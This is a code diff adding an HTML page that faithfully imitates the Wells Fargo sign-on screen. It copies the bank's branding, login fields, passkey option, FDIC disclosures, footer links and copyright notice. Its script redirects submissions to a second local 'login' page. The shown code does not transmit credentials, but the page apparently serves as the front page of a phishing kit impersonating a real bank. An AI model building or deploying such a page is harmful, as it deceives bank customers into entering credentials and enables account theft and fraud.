@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Wells Fargo Login</title>
+<style>
+* {
+box-sizing: border-box;
+margin: 0;
+padding: 0;
+font-family: Arial, Helvetica, sans-serif;
+}
+
+body {
+background-color: #ffffff;
+color: #333333;
+display: flex;
+flex-direction: column;
+min-height: 100vh;
+}
+
+/* --- Header Banner --- */
+header {
+background-color: #bd1e24; /* Wells Fargo Red */
+border-bottom: 6px solid #f4a900; /* Wells Fargo Gold */
+padding: 12px 16px;
+display: flex;
+justify-content: space-between;
+align-items: center;
+position: relative;
+}
+
+.logo {
+color: #ffffff;
+font-family: "Times New Roman", Times, serif;
+font-weight: bold;
+font-size: 22px;
+letter-spacing: 1px;
+margin: 0 auto; /* Centers the logo */
+}
+
+.menu-icon {
+position: absolute;
+right: 16px;
+cursor: pointer;
+}
+
+.menu-icon span {
+display: block;
+width: 24px;
+height: 3px;
+background-color: #ffffff;
+margin: 4px 0;
+}
+
+/* --- Main Content Container --- */
+.container {
+max-width: 480px;
+width: 100%;
+margin: 0 auto;
+padding: 24px 20px;
+flex-grow: 1;
+}
+
+.greeting {
+font-family: "Times New Roman", Times, serif;
+font-weight: 300;
+font-size: 36px;
+text-align: center;
+margin-bottom: 24px;
+color: #222222;
+}
+
+/* --- Form Elements --- */
+.input-group {
+position: relative;
+margin-bottom: 16px;
+}
+
+.input-group input {
+width: 100%;
+padding: 18px 16px;
+border: 1px solid #767676;
+border-radius: 16px;
+font-size: 16px;
+outline: none;
+color: #333333;
+}
+
+.input-group input:focus {
+border-color: #0074d9;
+}
+
+.input-group .show-btn {
+position: absolute;
+right: 16px;
+top: 50%;
+transform: translateY(-50%);
+color: #1a1f71;
+font-weight: bold;
+text-decoration: underline;
+cursor: pointer;
+font-size: 14px;
+}
+
+/* --- Checkbox --- */
+.checkbox-container {
+display: flex;
+align-items: flex-start;
+margin-bottom: 12px;
+}
+
+.checkbox-container input {
+width: 24px;
+height: 24px;
+margin-right: 12px;
+cursor: pointer;
+border: 1px solid #767676;
+border-radius: 4px;
+}
+
+.checkbox-container label {
+font-size: 16px;
+color: #333333;
+line-height: 24px;
+cursor: pointer;
+}
+
+.info-text {
+font-size: 13px;
+color: #555555;
+line-height: 1.4;
+margin-bottom: 28px;
+}
+
+/* --- Buttons --- */
+.btn {
+display: block;
+width: 100%;
+padding: 14px;
+border-radius: 25px;
+font-size: 16px;
+font-weight: bold;
+text-align: center;
+cursor: pointer;
+border: none;
+text-decoration: none;
+}
+
+.btn-signon {
+background-color: #e0dedc; /* Disabled gray style from image */
+color: #92908e;
+margin-bottom: 12px;
+transition: background-color 0.2s, color 0.2s;
+}
+
+/* Dynamic active state when fields are filled */
+.btn-signon.active {
+background-color: #bd1e24;
+color: #ffffff;
+}
+
+.divider {
+text-align: center;
+font-size: 14px;
+color: #333333;
+margin-bottom: 12px;
+}
+
+.btn-passkey {
+background-color: #ffffff;
+color: #222222;
+border: 1px solid #222222;
+display: flex;
+align-items: center;
+justify-content: center;
+gap: 6px;
+margin-bottom: 24px;
+}
+
+.forgot-link {
+display: flex;
+align-items: center;
+justify-content: center;
+color: #1a1f71;
+text-decoration: none;
+font-size: 15px;
+font-weight: 500;
+margin: 24px 0;
+}
+
+.forgot-link span {
+margin-right: 6px;
+font-size: 18px;
+}
+
+/* --- Footer Section --- */
+footer {
+background-color: #f4f0ec;
+padding: 24px 16px;
+border-top: 1px solid #e0dedc;
+font-size: 13px;
+color: #333333;
+}
+
+.footer-container {
+max-width: 480px;
+margin: 0 auto;
+}
+
+/* Investment Disclosure Box */
+.disclosure-box {
+border: 1px solid #cccccc;
+background-color: #ffffff;
+padding: 16px;
+margin-bottom: 20px;
+}
+
+.disclosure-box h4 {
+font-size: 14px;
+margin-bottom: 12px;
+color: #222222;
+}
+
+.disclosure-box ul {
+list-style-type: square;
+padding-left: 16px;
+}
+
+.disclosure-box li {
+margin-bottom: 8px;
+font-weight: bold;
+color: #333333;
+}
+
+.disclosure-box li:last-child {
+margin-bottom: 0;
+}
+
+.deposit-text {
+margin-bottom: 24px;
+line-height: 1.4;
+}
+
+/* Links Grid */
+.footer-links {
+display: grid;
+grid-template-columns: 1fr 1fr;
+gap: 16px 12px;
+margin-bottom: 24px;
+}
+
+.footer-links a {
+color: #333333;
+text-decoration: none;
+line-height: 1.3;
+}
+
+.footer-links a:hover {
+text-decoration: underline;
+}
+
+.copyright {
+color: #555555;
+font-size: 12px;
+border-top: 1px solid #dcd8d4;
+padding-top: 16px;
+line-height: 1.4;
+}
+</style>
+</head>
+<body>
+
+<header>
+<div class="logo">WELLS FARGO</div>
+<div class="menu-icon">
+<span></span>
+<span></span>
+<span></span>
+</div>
+</header>
+
+<main class="container">
+<h1 class="greeting">Good afternoon</h1>
+
+<form id="loginForm" action="./Otherhtml/login.html" method="GET">
+<div class="input-group">
+<input type="text" id="username" placeholder="Username" aria-label="Username" required>
+</div>
+
+<div class="input-group">
+<input type="password" id="password" placeholder="Password" aria-label="Password" required>
+<span class="show-btn" id="togglePassword">Show</span>
+</div>
+
+<div class="checkbox-container">
+<input type="checkbox" id="save-username">
+<label for="save-username">Save username</label>
+</div>
+
+<p class="info-text">
+To help keep your account secure, save your username only on devices that aren't used by other people.
+</p>
+
+<button type="submit" id="submitBtn" class="btn btn-signon">Sign on</button>
+</form>
+
+<div class="divider">or</div>
+
+<button class="btn btn-passkey">
+<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" style="vertical-align: middle;">
+<path d="M12 2C9.24 2 7 4.24 7 7c0 2.76 2.24 5 5 5s5-2.24 5-5c0-2.76-2.24-5-5-5zm0 12c-4.42 0-8 2.58-8 6v2h16v-2c0-3.42-3.58-6-8-6z"/>
+</svg>
+Use a passkey
+</button>
+
+<p class="info-text" style="text-align: center;">
+Don't have one? Create a passkey after signing on and skip the password next time.
+</p>
+
+<a href="#" class="forgot-link">
+<span>&rarr;</span> Forgot username or password?
+</a>
+</main>
+
+<footer>
+<div class="footer-container">
+<div class="disclosure-box">
+<h4>Investment and Insurance Products are:</h4>
+<ul>
+<li>Not Insured by the FDIC or Any Federal Government Agency</li>
+<li>Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate</li>
+<li>Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested</li>
+</ul>
+</div>
+
+<p class="deposit-text">
+Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.
+</p>
+
+<div class="footer-links">
+<a href="#">About Wells Fargo</a>
+<a href="#">Report Email Fraud</a>
+<a href="#">Online Access Agreement</a>
+<a href="#">Security Center</a>
+<a href="#">Privacy, Cookies, Security & Legal</a>
+<a href="#">Sitemap</a>
+<a href="#">Do not sell or share my personal information</a>
+<a href="#">Give Us Feedback</a>
+<a href="#">Notice of Data Collection</a>
+</div>
+
+<p class="copyright">
+&copy; 1999 - 2026 Wells Fargo. All rights reserved. NMLSR ID 399801
+</p>
+</div>
+</footer>
+
+<script>
+const form = document.getElementById('loginForm');
+const usernameInput = document.getElementById('username');
+const passwordInput = document.getElementById('password');
+const submitBtn = document.getElementById('submitBtn');
+const togglePassword = document.getElementById('togglePassword');
+
+// Function to dynamically update button style when details are entered
+function checkInputs() {
+    if (usernameInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
+        submitBtn.classList.add('active');
+    } else {
+        submitBtn.classList.remove('active');
+    }
+}
+
+usernameInput.addEventListener('input', checkInputs);
+passwordInput.addEventListener('input', checkInputs);
+
+// Simple password toggle logic for the "Show" text button
+togglePassword.addEventListener('click', function() {
+    if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        togglePassword.textContent = 'Hide';
+    } else {
+        passwordInput.type = 'password';
+        togglePassword.textContent = 'Show';
+    }
+});
+
+// Intercept submission, validate, and go to the targeted relative subfolder
+form.addEventListener('submit', function(e) {
+    e.preventDefault();
+    if (usernameInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
+        window.location.href = "./Otherhtml/login.html";
+    }
+});
+</script>
+
+</body>
+</html>
